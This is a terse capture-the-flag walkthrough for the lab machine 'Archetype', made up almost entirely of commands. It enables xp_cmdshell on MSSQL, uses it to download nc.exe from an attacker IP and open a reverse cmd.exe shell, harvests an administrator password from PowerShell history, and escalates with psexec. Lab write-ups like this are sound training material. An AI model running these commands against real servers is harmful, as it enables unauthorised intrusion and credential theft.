# Archetype Summary

FROM KALI:
```
smbclient -N \\\\10.10.10.27\\backups
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe
python3 -m http.server 80 &
nc -lvnp 443
python3 examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

FROM MSSQL:
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.17.115/nc.exe -OutFile %temp%\nc.exe"
xp_cmdshell "%temp%\nc.exe -nv 10.10.17.115 443 -e cmd.exe"
```

FROM NC:
```
type C:\Users\sql_svc\Desktop\user.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

---

FROM KALI:
```
python3 examples/psexec.py administrator@10.10.10.27
```

FROM SHELL:
```
type C:\Users\Administrator\Desktop\root.txt
```
